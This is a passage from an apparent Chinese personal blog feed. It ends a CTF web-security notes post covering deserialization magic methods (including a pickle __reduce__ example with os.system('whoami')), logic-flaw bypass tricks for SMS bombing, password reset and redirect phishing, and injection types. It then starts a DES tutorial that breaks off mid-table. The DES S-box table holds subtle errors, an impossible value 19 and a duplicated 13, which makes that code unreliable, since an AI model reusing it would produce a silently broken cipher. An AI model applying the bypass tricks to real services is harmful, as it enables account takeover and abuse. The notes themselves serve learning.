title="PHP反序列化"></a>PHP反序列化</h4><p>序列化函数<code>serilize()</code>；反序列化函数<code>unserialize()</code>；字符串格式<code>O:长度:类名:属性数:&#123;S:属性名长度:属性名;S:值的长度:值;i:数值;b:1代表true，0代表false;N:空;......&#125;</code>；需要注意url编码<code>urlencoder()</code></p><p>php的数组特性：当一个数组被当作函数触发时，如果数组第一个元素是对象，第二个是方法的名字，那么就会调用该对象下的对应方法；对于下面的例子<code>$a=new demo;$a-&gt;test();</code>可以调用该方法，当然也可以<code>$arr=[$demo,&#39;test&#39;];$arr();</code>来调用。此外<code>create_function(&#39;$a,$b;&#39;,&#39;echo($a+$b);&#39;);</code>这样的创造函数的函数也时常会用到（仅创造不调用）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>__wakeup绕过CVE-2016-7124，影响版本PHP5&lt;5.6.25，PHP7&lt;7.0.10</p><p>魔术函数，从序列化到反序列化过程顺序如下（there are too many）：</p><ol><li><code>__constuct()</code>——对象创建时自动调用（unserialize不调用）</li><li><code>__sleep()</code>——serialize()前调用</li><li><code>__wakeup()</code>——unseriallize()时自动调用</li><li><p><code>__toString()</code>——对象被输出时自动调用</p></li><li><p><code>__destruct()</code>——销毁对象时自动调用</p></li></ol><p>POP（面向属性编程）链：用户可控反序列化—魔术方法—魔术方法中的其他函数—寻找同名函数/可以传递参数的函数—构造Poc进行测试。说白了就是找类与函数并构造的过程</p><h4 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h4><p>与PHP相似，但是用的是pickle和cPickle模块，主要用到就pickle模块</p><p>将对象序列化<code>pickle.dumps()</code>然后存储为文件<code>pickle.dump()</code>、将字符串反序列化<code>pickle.loads()</code>从文件中读取<code>pickle.load()</code>、调试工具<code>pickletools</code>能够反汇编一个被打包的字符串<code>pickletools.dis()</code>&amp;&amp;优化一个被打包的字符串<code>pickletools.optimize()</code>&amp;&amp;返回一个迭代器</p><p>Python中的魔术方法</p><ul><li><code>__new__()</code>该方法属于构造函数，与init相似，主要用于不可变字符串类型，还是将参数给init</li><li><code>__init__()</code>同上，用于初始化，都会被调用</li><li><code>__del__()</code>解构函数</li><li><code>__reduce__()</code>会在反序列化过程结束时自动调用，并返回一个元组（第一个元素是可调用的对象，第二个元素是前者的参数，ex：os.system()与[“whoami”,”…”]</li></ul><h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p>需要使用到<code>ObjectInputStream</code>类来完成，<code>writeObject</code>进行序列化，反序列化时会调用对象的<code>readObject</code>方法；根本原因在于用户重写的<code>readObject</code>有漏洞</p><p>值得注意的是，只有实现了<code>Serializable</code>接口的类的对象才可以被序列化，<code>Serializable</code>接口是启用其序列化功能的接口，没有实现此接口的类将不能使他们的任一状态被序列化或反序列化。</p><p>而<code>readObject()</code>方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，<code>readObject()</code>是可以重写的，可以定制反序列化的一些行为</p><p>相关漏洞：WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)</p><p>防御措施：hh代码审计、黑盒检测、白名单等</p><hr><h3 id="逻辑错误漏洞"><a href="#逻辑错误漏洞" class="headerlink" title="逻辑错误漏洞"></a>逻辑错误漏洞</h3><p>程序设计有问题，没有考虑完整情况；无法用扫描器查出；burp看包！！！</p><p>流程：发现功能模块—确定模块功能流程—抓包—改参数</p><ul><li><p>url跳转：url参数中的link=木马网站；sso登录、验证跳转配合钓鱼、xss、csrf、浏览器漏洞（CVE-2018-8174）；bypass方式：真的@钓鱼、真的#钓鱼、真的？钓鱼；</p></li><li><p>短信轰炸：服务器发送短信无限制，存在于需要短信验证的位置；bypass方式：电话后加空格（%20）、叠加参数和值（重复）、大小写绕过、cookie修改、抓包更改本机IP、修改验证发送返回值</p></li><li><p>验证码DDOS：用户对图片验证码的大小进行不断更改，使服务器不断生成较大的图片，用以占用资源</p></li><li><p>任意密码重置漏洞：验证码爆破（ip限制次数、注意验证码过期）、验证凭证回传、验证码输入需要的验证码没有检查是否与账号固定、本地验证码JS绕过、跳过验证直接走到更改页面、Token可预测（时间戳、递增数列）、忘记删除的万能验证码</p></li><li><p>任意用户登录漏洞：验证码、返回包修改（用户名等）、万能密码（sql注入类似）</p></li><li><p>越权漏洞：包括水平/横向越权和垂直/纵深越权，前者平级，后者越级，对于用户身份没有验证；抓包修改id；</p></li><li><p>支付逻辑漏洞：0元购买、负数商品数量、购买状态、购买物品id、<em>修改优惠券/积分</em>、测试数据未删除；</p></li><li><p>条件竞争漏洞：多线程且无锁下，burp的爆破模块；抽奖、文件上传中竞争上传</p></li></ul><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><ul><li><p>XML注入：类似于XSS，插入成对的闭合标签，需要标签闭合和XML表结构；将预定义字符进行转义即可修复</p></li><li><p>XPath注入：XML路径语言，基于XML树状结构，提供在树中寻找节点的能力，类似SQL注入；预防同上</p></li></ul><div class="table-container"><table><thead><tr><th>符号</th><th>含义</th><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>/</td><td>根节点选取</td><td>//</td><td>从当前节点选择文档</td></tr><tr><td>.</td><td>当前节点</td><td>..</td><td>父节点</td></tr><tr><td>@</td><td>选取属性</td><td>*</td><td>通配符</td></tr><tr><td>@*或：</td><td>选择所有属性</td><td>（）[]</td><td>为运算分组/应用筛选模式</td></tr></tbody></table></div><ul><li>JSON注入：木有意义，只能破坏文件；输入<code>xxx&quot;xxx</code>即可</li><li>HPP：http参数污染，将一个参数多次重复输入，只取最后面的/最前面的；利用脚本与WAF取值不同来绕过防火墙</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对称密码&amp;Hash</title>
      <link href="/2023/09/16/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81/"/>
      <url>/2023/09/16/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><p>DES属于对称密码体制，前美国数据加密标准，也是一个分组加密算法。参考<a href="https://www.cnblogs.com/songwenlong/p/5944139.html">DES算法详解 - songoo</a></p><p>传统DES以64位一组进行加密，密钥长度也是64位（实际使用56位，其中的8、16、24、32、40、48、56、64位作为奇校验位）</p><blockquote><p>奇校验：原始码+校验码=奇数个1；偶校验：原始码+校验码=偶数个1</p></blockquote><h4 id="明文初始化-IP置换"><a href="#明文初始化-IP置换" class="headerlink" title="明文初始化=IP置换"></a>明文初始化=IP置换</h4><p>将64位的明文按位重组，并将重组后的64位对半分为L0和R0两部分；下面是置换规则：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> IP[<span class="number">64</span>]=&#123;</span><br><span class="line"><span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">64</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="E扩展-E盒"><a href="#E扩展-E盒" class="headerlink" title="E扩展/E盒"></a>E扩展/E盒</h4><p>选取IP置换过后的明文右半部分R0，按照如下规则扩展为48位：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> E[<span class="number">48</span>]=&#123;</span><br><span class="line">    <span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,</span><br><span class="line">    <span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,</span><br><span class="line">    <span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,</span><br><span class="line">    <span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,</span><br><span class="line">    <span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,</span><br><span class="line">    <span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,</span><br><span class="line">    <span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,</span><br><span class="line">    <span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="密钥置换"><a href="#密钥置换" class="headerlink" title="密钥置换"></a>密钥置换</h4><p>将64位密钥（还是56位，去掉校验码）按照下面先进行<strong>置换</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> k1[<span class="number">56</span>]=&#123;</span><br><span class="line"><span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后分为两组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> C[<span class="number">28</span>]=&#123;</span><br><span class="line"><span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> D[<span class="number">28</span>]=&#123;</span><br><span class="line"><span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再将每组都根据轮数将密钥进行<strong>向左循环移动1、2位</strong>，重复16轮：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> mv_left[<span class="number">16</span>]=&#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>左移后合并，再从56位密钥中选出48位：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> k2[<span class="number">48</span>]=&#123;</span><br><span class="line"><span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,<span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="S盒代替"><a href="#S盒代替" class="headerlink" title="S盒代替"></a>S盒代替</h4><p>此时密钥和变换后的R0都变成了48位，需要先将两者进行XOR运算，之后得到48位的数据（这里就叫做F，灰常important），之后将F按照6位一组，共分8组，放入到S盒（4行*16列）中，然后按照如下规则选取每个S盒中的对应位置</p><blockquote><p>比如101101（假设是第三组），我们选取第一位和最后一位组成11=3，即第三行；中间四位0110=6，即第六列；就到S3中选取第三行，第6列的</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> S1[<span class="number">8</span>][<span class="number">4</span>][<span class="number">16</span>]=&#123;</span><br><span class="line">    &#123;</span><br><span class="line">    &#123;<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>&#125;,&#123;<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,&#123;<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>&#125;,&#123;<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>&#125;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">&#123;<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>&#125;,&#123;<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>&#125;,&#123;<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>&#125;,&#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>&#125;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    &#123;<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>&#125;,&#123;<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>&#125;,&#123;<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>&#125;,&#123;<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>&#125;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    &#123;<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>&#125;,&#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">19</span>&#125;,&#123;<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>&#125;,&#123;<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>&#125;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    &#123;<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,&#123;<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,&#123;<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>&#125;,&#123;<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>&#125;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    &#123;<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>&#125;,&#123;<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,&#123;<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>&#125;,&#123;<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>&#125;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    &#123;<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>&#125;,&#123;<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,&#123;<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>&#125;</span><br><span class="line">&#125;,&#123;</span><br><span class="line">    &#123;<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>&#125;,&#123;<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,&#123;<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>&#125;,&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span 